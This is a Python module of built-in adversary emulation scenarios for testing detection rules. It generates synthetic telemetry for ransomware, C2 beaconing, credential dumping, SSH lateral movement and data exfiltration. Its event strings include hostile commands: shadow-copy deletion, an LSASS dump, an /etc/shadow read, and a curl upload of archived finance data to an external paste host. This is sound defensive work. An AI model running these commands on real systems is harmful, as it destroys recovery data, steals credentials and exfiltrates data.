"""Built-in adversary emulation scenarios.

Each scenario chains a handful of ATT&CK techniques into a realistic
attack story. They map onto the bundled rule catalog so a default
deployment should detect most of them, which makes them useful both as
a smoke test ("did my detection stack regress?") and as a teaching aid.

The scenarios are intentionally generic emulations - they generate the
*telemetry shape* an attack produces, not real exploits.
"""

from __future__ import annotations

from typing import Dict, List

from .generators import auth_event, file_event, netconn, proc
from .model import Scenario, ScenarioStep


# --- ransomware --------------------------------------------------

def ransomware_scenario() -> Scenario:
    def s_phish_exec(ctx: Dict) -> List:
        return [proc(ctx, "winword.exe", "winword.exe /n invoice.docm"),
                proc(ctx, "powershell.exe",
                     "powershell -enc " + "QQ" * 60, advance=2.0)]

    def s_download(ctx: Dict) -> List:
        ctx["_last_image"] = "powershell.exe"
        return [netconn(ctx, "185.220.101.5", 443, bytes_recv=2_500_000)]

    def s_persistence(ctx: Dict) -> List:
        return [file_event(ctx, "C:/Windows/System32/Tasks/Updater", "create")]

    def s_shadow_delete(ctx: Dict) -> List:
        return [proc(ctx, "vssadmin.exe", "vssadmin delete shadows /all /quiet")]

    def s_encrypt(ctx: Dict) -> List:
        return [file_event(ctx, f"C:/Users/{ctx['user']}/Documents/report{i}.locked", "write")
                for i in range(5)]

    return Scenario(
        scenario_id="ransomware",
        name="Ransomware intrusion",
        description="Phished macro -> PowerShell loader -> C2 -> persistence -> shadow deletion -> mass encryption.",
        tactic_chain=["execution", "command-and-control", "persistence", "impact"],
        references=["https://attack.mitre.org/techniques/T1486/"],
        steps=[
            ScenarioStep("rw-1", "Macro spawns PowerShell", "T1059", s_phish_exec,
                         "Office macro launches an encoded PowerShell loader."),
            ScenarioStep("rw-2", "C2 download", "T1071", s_download,
                         "Loader pulls the payload from a C2 host."),
            ScenarioStep("rw-3", "Scheduled task persistence", "T1547", s_persistence,
                         "Drops a scheduled-task autostart."),
            ScenarioStep("rw-4", "Shadow copy deletion", "T1490", s_shadow_delete,
                         "Deletes volume shadow copies to inhibit recovery.",
                         expect_detection=False),
            ScenarioStep("rw-5", "Mass file encryption", "T1486", s_encrypt,
                         "Writes ransomware-extension files across the user profile."),
        ],
    )


# --- c2 beacon ---------------------------------------------------

def c2_beacon_scenario() -> Scenario:
    def s_implant(ctx: Dict) -> List:
        return [proc(ctx, "svchost.exe", "svchost.exe -k netsvcs")]

    def s_beacon(ctx: Dict) -> List:
        ctx["_last_image"] = "svchost.exe"
        out = []
        for i in range(6):
            out.append(netconn(ctx, "45.13.227.99", 4444, bytes_sent=512, bytes_recv=128, advance=30.0))
        return out

    def s_exfil(ctx: Dict) -> List:
        ctx["_last_image"] = "svchost.exe"
        return [netconn(ctx, "45.13.227.99", 4444, bytes_sent=80_000_000, bytes_recv=256)]

    return Scenario(
        scenario_id="c2_beacon",
        name="C2 beacon + exfiltration",
        description="Implant beacons to a rare port on an interval, then exfiltrates a large blob.",
        tactic_chain=["command-and-control", "exfiltration"],
        steps=[
            ScenarioStep("c2-1", "Implant process", "T1055", s_implant,
                         "A masquerading svchost implant starts.", expect_detection=False),
            ScenarioStep("c2-2", "Periodic beacon", "T1571", s_beacon,
                         "Regular small callbacks to a non-standard port."),
            ScenarioStep("c2-3", "Large egress", "T1041", s_exfil,
                         "Bulk data pushed back over the C2 channel."),
        ],
    )


# --- credential dumping ------------------------------------------

def credential_dumping_scenario() -> Scenario:
    def s_recon(ctx: Dict) -> List:
        return [proc(ctx, "whoami.exe", "whoami /priv"),
                proc(ctx, "net.exe", "net group \"domain admins\" /domain")]

    def s_dump(ctx: Dict) -> List:
        return [proc(ctx, "procdump.exe", "procdump -ma lsass.exe lsass.dmp")]

    def s_read_secrets(ctx: Dict) -> List:
        return [file_event(ctx, "/etc/shadow", "read")]

    return Scenario(
        scenario_id="credential_dumping",
        name="Credential access",
        description="Privilege recon followed by an LSASS dump and a shadow file read.",
        tactic_chain=["discovery", "credential-access"],
        steps=[
            ScenarioStep("cd-1", "Privilege recon", "T1082", s_recon,
                         "Enumerate privileges and domain admins.", expect_detection=False),
            ScenarioStep("cd-2", "LSASS dump", "T1003", s_dump,
                         "procdump targets LSASS memory."),
            ScenarioStep("cd-3", "Shadow file read", "T1003", s_read_secrets,
                         "Reads the Unix shadow credential store."),
        ],
    )


# --- lateral movement --------------------------------------------

def lateral_movement_scenario() -> Scenario:
    def s_bruteforce(ctx: Dict) -> List:
        return [auth_event(ctx, "Failed password for root from 10.0.0.5", advance=0.5)
                for _ in range(8)]

    def s_success(ctx: Dict) -> List:
        return [auth_event(ctx, "Accepted password for root from 10.0.0.5", status="success")]

    def s_pivot(ctx: Dict) -> List:
        ctx["host"] = "db1"
        return [proc(ctx, "ssh", "ssh root@10.0.0.20"),
                netconn(ctx, "10.0.0.20", 22, bytes_sent=2048)]

    return Scenario(
        scenario_id="lateral_movement",
        name="Brute force + lateral movement",
        description="SSH brute force succeeds, then the attacker pivots to an internal host.",
        tactic_chain=["credential-access", "lateral-movement"],
        steps=[
            ScenarioStep("lm-1", "SSH brute force", "T1110", s_bruteforce,
                         "Repeated failed root logins."),
            ScenarioStep("lm-2", "Successful login", "T1078", s_success,
                         "Brute force succeeds.", expect_detection=False),
            ScenarioStep("lm-3", "Pivot via SSH", "T1021", s_pivot,
                         "Lateral SSH to an internal database host.", expect_detection=False),
        ],
    )


# --- data exfiltration -------------------------------------------

def data_exfiltration_scenario() -> Scenario:
    def s_collect(ctx: Dict) -> List:
        return [proc(ctx, "tar", "tar czf /tmp/loot.tgz /home/finance"),
                file_event(ctx, "/tmp/loot.tgz", "write")]

    def s_stage(ctx: Dict) -> List:
        return [proc(ctx, "curl", "curl -T /tmp/loot.tgz https://paste.example.io/upload")]

    def s_exfil(ctx: Dict) -> List:
        ctx["_last_image"] = "curl"
        return [netconn(ctx, "203.0.113.77", 443, bytes_sent=120_000_000)]

    return Scenario(
        scenario_id="data_exfiltration",
        name="Collection + web exfiltration",
        description="Sensitive data is archived to /tmp then exfiltrated to a web service.",
        tactic_chain=["collection", "exfiltration"],
        steps=[
            ScenarioStep("ex-1", "Archive collected data", "T1560", s_collect,
                         "Archive the finance directory to a temp file.", expect_detection=False),
            ScenarioStep("ex-2", "Stage to web service", "T1567", s_stage,
                         "Upload archive to an external paste service.", expect_detection=False),
            ScenarioStep("ex-3", "Bulk egress", "T1041", s_exfil,
                         "Large outbound transfer."),
        ],
    )


SCENARIO_LIBRARY: Dict[str, Scenario] = {
    s.scenario_id: s for s in (
        ransomware_scenario(),
        c2_beacon_scenario(),
        credential_dumping_scenario(),
        lateral_movement_scenario(),
        data_exfiltration_scenario(),
    )
}


def get_scenario(scenario_id: str) -> Scenario:
    scenario = SCENARIO_LIBRARY.get(scenario_id)
    if scenario is None:
        raise KeyError(f"unknown scenario: {scenario_id}")
    return scenario


def list_scenarios() -> List[Scenario]:
    return list(SCENARIO_LIBRARY.values())
